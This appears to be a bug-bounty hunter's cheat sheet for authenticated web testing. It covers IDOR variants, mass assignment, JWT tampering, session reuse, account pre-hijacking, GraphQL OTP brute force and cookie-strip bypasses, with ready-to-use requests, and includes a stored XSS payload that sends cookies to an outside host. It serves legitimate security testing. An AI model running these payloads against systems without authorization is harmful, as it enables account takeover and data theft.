# 17 — Authenticated Testing: Commonly Missed Checks

> Load this whenever entering authenticated testing phase. These are the checks most hunters do shallowly or skip entirely. Each one has paid at P1/P2 on real programs.

---

## IDOR at Depth — Beyond the Obvious Endpoints

### Nested Object IDOR (most missed)
Server checks auth on the parent route but NOT the leaf node.
```
GET /orgs/{orgId}               → 403 ✓ (auth enforced)
GET /orgs/{orgId}/projects/{id}/comments/{commentId}  → 200 ✗ (leaf unprotected)
```
Test EVERY nested sub-resource independently. Don't assume parent auth propagates down.

### Async Job Result IDOR (consistently pays $$$)
Trigger an export/report → get a `job_id` → fetch the result URL without ownership check.
```bash
# Step 1: Trigger as User A
POST /api/exports  {"type":"user_data"}  → {"job_id":"abc123"}

# Step 2: Fetch as User B (different session)
GET /api/exports/abc123/download  → returns User A's data = confirmed P1
```
Test this on: data exports, PDF report generation, bulk CSV downloads, async search results, background analytics jobs.

### Soft-Deleted Resource Access
App marks records `deleted_at=<timestamp>` but API still returns them via direct ID.
```bash
# Delete the resource via UI, then:
GET /api/users/DELETED_USER_ID/profile  → still returns full profile
DELETE /api/posts/DELETED_POST_ID       → still processes
```
Particularly dangerous for: deleted payment methods, archived projects, removed team members.

### Pagination Cursor/Offset IDOR
Swap the cursor or offset to land in another user's data page.
```bash
# Your own cursor: GET /api/messages?cursor=YOUR_CURSOR
# Increment/decrement cursor → another user's message page
GET /api/messages?cursor=PREDICTED_OTHER_CURSOR   → other user's data
GET /api/orders?page=1&limit=20&user_id=VICTIM    → enumeration
```

### Bulk Operation IDOR
Batch endpoints that take arrays of IDs — mix in other users' IDs.
```bash
DELETE /api/items  {"ids": ["yours", "OTHER_USER_ID", "OTHER_USER_ID_2"]}
POST /api/messages/read  {"message_ids": ["yours", "VICTIM_MSG_ID"]}
```

### Per-Verb Gap (always test ALL verbs independently)
GET and PUT scoped. DELETE, archive, clone, export not.
```bash
GET    /api/posts/VICTIM_ID  → 403
DELETE /api/posts/VICTIM_ID  → 200  ← unguarded sibling
PUT    /api/posts/VICTIM_ID  → 403
POST   /api/posts/VICTIM_ID/clone  → 200  ← unguarded action
```

---

## Mass Assignment (test on every PATCH/PUT/POST)

Add extra fields to EVERY state-changing request. Frameworks often bind them silently.

```bash
# Original request
PATCH /api/users/me  {"name":"test"}

# Mass assignment test — add escalation fields
PATCH /api/users/me  {
  "name":"test",
  "role":"admin",
  "is_admin":true,
  "subscription_tier":"enterprise",
  "org_id":"VICTIM_ORG",
  "credits":9999,
  "verified":true,
  "email_verified":true,
  "plan":"unlimited"
}
# If any field is reflected back in the response at the new value → confirmed
```

Also test on registration (`POST /signup`), profile update, and invitation accept endpoints.

---

## Second-Order / Stored Payload Attacks

Store a payload in a field → it triggers later in a different context.

**High-yield surfaces:**
- Profile name/bio → appears in PDF invoice/report → SSTI/XSS
- Comment/ticket → rendered in admin email → XSS in admin context
- File name on upload → rendered in CSV export → CSV injection
- Company name → rendered in contract PDF → SSTI
- Username → appears in markdown renderer → stored XSS

```bash
# SSTI payload stored in profile name
PATCH /api/users/me  {"name":"{{7*7}}"}
# Then trigger a PDF export, download it, check if "49" appears → SSTI confirmed

# XSS stored in bio → triggers when admin views user list
PATCH /api/users/me  {"bio":"<img src=x onerror=fetch('https://burp.collab/'+document.cookie)>"}
```

---

## Auth Layer Attacks (Post-Login)

### JWT After Auth — Test Every Claim
```bash
# Decode your JWT, modify, re-encode
python3 -c "
import base64, json
token = 'YOUR_JWT'
parts = token.split('.')
payload = json.loads(base64.b64decode(parts[1] + '=='))
print(json.dumps(payload, indent=2))
"
# Claims to tamper: sub, uid, user_id, email, role, org_id, tenant_id, is_admin, plan
# Attacks: alg:none, RS256→HS256, kid path-traversal, claim swap
```

### Session Not Invalidated
```bash
# 1. Note your current session token
# 2. Change password / change email
# 3. Use the OLD session token → should get 401
# If still 200 → session lives after credential change → ATO primitive
```

### API Key Scope Escalation
```bash
# Create API key via UI (restricted to read-only)
POST /api/keys  {"name":"test","scopes":["read"]}  → {"key":"...","scopes":["read"]}

# Try requesting scopes above your role
POST /api/keys  {"name":"test","scopes":["read","write","admin","delete_users"]}
# If granted → confirmed vertical escalation
```

### Refresh Token Reuse After Revocation
```bash
# 1. Get refresh token
# 2. Log out (should revoke it)
# 3. POST /auth/refresh  {"refresh_token":"OLD_TOKEN"}
# If returns new access token → session lives after logout → ATO
```

---

## WebSocket Auth — Message-Level vs Connect-Level

Auth is checked only on `CONNECT`, not on each subsequent message.

```bash
# Step 1: Connect legitimately (auth passes)
wscat -c wss://target.com/ws  -H "Cookie: session=YOURS"

# Step 2: After connection is established, send messages with VICTIM's IDs
{"type":"subscribe","channel":"user_updates","user_id":"VICTIM_ID"}
{"type":"get_messages","room_id":"PRIVATE_ROOM_ID"}
{"type":"send","to":"VICTIM_ID","data":"..."}

# If server responds with victim's data → WS auth only on connect, not per-message
```

---

## Account Pre-Hijacking

Register victim's email BEFORE they do → when they use OAuth to sign up, accounts merge → you own their session.

```bash
# Step 1: Know victim's email (via OSINT, leak, or predictable pattern)
# Step 2: Register with that email BEFORE victim
POST /signup  {"email":"victim@company.com","password":"attacker_pass"}
# Note: email verification may or may not be required

# Step 3: Victim signs up via Google OAuth with same email
# If app links accounts by email → attacker retains access

# Variant: sign up, do NOT verify email, victim registers via OAuth → app auto-verifies → attacker logs in
```

---

## Invitation Flow Abuse

```bash
# 1. Accept invite as wrong email (IDOR on invite token)
POST /invites/TOKEN/accept  {"email":"attacker@evil.com"}
# Server should check token→email binding

# 2. Invite yourself to higher role
POST /invites  {"email":"attacker@evil.com","role":"admin"}  # as regular user
# Should be rejected if role is above your own

# 3. Resend/reuse expired invite tokens
GET /invites/OLD_TOKEN/accept  # after expiry
# Server should validate expiry

# 4. Race invite accept — accept + simultaneous role change
```

---

## Subscription & Feature Gate Bypass

```bash
# Downgrade account → immediately hit premium endpoints with old token
# Many apps check plan at TOKEN ISSUE TIME, not at REQUEST TIME

# Step 1: Upgrade to premium → note the endpoint
# Step 2: Downgrade back to free
# Step 3: Use your premium-era session/token → hit premium endpoints
GET /api/exports/enterprise  -H "Authorization: Bearer OLD_TOKEN"
POST /api/ai/analyze         -H "Authorization: Bearer OLD_TOKEN"
# If 200 → plan check is not per-request

# Also test: direct API call to premium endpoint skipping the UI gate entirely
POST /api/premium/feature  # with free-tier token → server may never check
```

---

## Multi-Tenant Trust Boundary

```bash
# Tenant ID in JWT claim — can you modify it?
# Decode token, change org_id/tenant_id claim, re-sign (alg:none or RS256→HS256)

# Tenant ID passed as header — server trusts client?
GET /api/data  -H "X-Tenant-ID: VICTIM_TENANT"

# Shared resources (templates, media, reports) scoped to org but check missing
GET /api/templates/TEMPLATE_ID  # created by different org → does auth check org ownership?

# Tenant switching via `?org_id=` override
GET /api/dashboard?org_id=VICTIM_ORG  # with your own session
```

---

## Cookie Strip Bypass (confirmed paid pattern)

Before accepting a 401/403 as "protected," retry with Cookie header fully absent.
Root cause: cookie-present path runs real authz check; no-cookie path falls through to a weaker check.

```bash
# Normal (blocked)
DELETE /api/v1/feature/RESOURCE_ID  -H "Cookie: session=YOURS"  → 403

# Strip cookie (bypass)
DELETE /api/v1/feature/RESOURCE_ID  # no Cookie header → 200

# Also test: strip Authorization header while keeping Cookie, and vice versa
```

Run this on EVERY state-changing endpoint (DELETE/PUT/PATCH/POST) that 401/403s.

---

## GraphQL Authenticated Specifics

```bash
# Every mutation needs its own IDOR test — not just queries
mutation { deletePost(id: VICTIM_POST_ID) { success } }
mutation { updateUser(id: VICTIM_ID, role: "admin") { success } }

# Query batching to bypass per-query rate limits
# 100 mutations in one HTTP request → rate limit never fires per-mutation
[{"query":"mutation { login(u:\"admin\",p:\"pass1\") { token } }"},...]

# Alias batching for OTP brute force
{ v1000: verifyOTP(code:"1000",token:"VICTIM") { success }
  v1001: verifyOTP(code:"1001",token:"VICTIM") { success } ... }

# __typename leaks object IDs from other tenants in union types
{ feed { __typename ... on Post { id } ... on PrivateMessage { id content } } }

# Subscription IDOR — subscribe to another user's events
subscription { orderUpdated(userId: VICTIM_ID) { status total } }
```

---

## Systematic IDOR Checklist (run on every object type)

For every resource the app exposes, test all of these — not spot-checking 2-3 endpoints:

```
[ ] GET    /resource/{id}           → cross-user read
[ ] PUT    /resource/{id}           → cross-user write
[ ] PATCH  /resource/{id}           → cross-user partial update
[ ] DELETE /resource/{id}           → cross-user delete
[ ] POST   /resource/{id}/action    → cross-user action (archive, clone, export, publish)
[ ] GET    /resource/{id}/export    → cross-user export (separate auth check?)
[ ] GET    /resource/{id}/child     → nested resource IDOR
[ ] GET    /export-jobs/{job_id}    → async job result IDOR
[ ] GET    /resource?user_id=VICTIM → filter param IDOR
[ ] DELETE /resource  {"ids":[...]} → bulk delete IDOR
```

---

## High-Signal Parameters to Always Fuzz (Authenticated)

```
role, is_admin, plan, tier, subscription_type, is_premium, is_verified,
org_id, tenant_id, account_id, user_id, owner_id,
status, account_status, is_active, is_deleted, banned, suspended,
credits, balance, quota, seats,
scope, permissions, access_level,
expires_at, trial_end, valid_until
```

Add these to every PUT/PATCH/POST. If any appears in the response at the injected value → mass assignment confirmed.
